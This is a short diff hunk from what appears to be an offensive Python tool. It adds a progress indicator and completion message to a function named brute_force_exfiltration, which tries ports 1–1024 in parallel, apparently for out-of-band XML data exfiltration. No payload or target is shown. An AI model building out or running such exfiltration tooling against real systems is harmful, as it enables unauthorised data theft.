@@ -234,9 +234,18 @@ def brute_force_exfiltration(good_payload: dict, base_xml: str, local_ip: str, t
     try:
         with ThreadPoolExecutor(max_workers=max_threads) as executor:
             futures = {executor.submit(worker, p): p for p in range(1, 1025)}
+            total = len(futures)
+            completed = 0
+
             for future in as_completed(futures):
+                completed += 1
+                percent = int((completed / total) * 100)
+                print(f"\r[*] Brute-force progress: {percent}%", end="", flush=True)
+
                 if stop_flag.is_set():
                     break
+            print("\n[*] Brute-force complete.")
+
     except KeyboardInterrupt:
         print("\n[!] Brute-force interrupted by user. Cleaning up...")
         cleanup_ufw_ports(active_ports)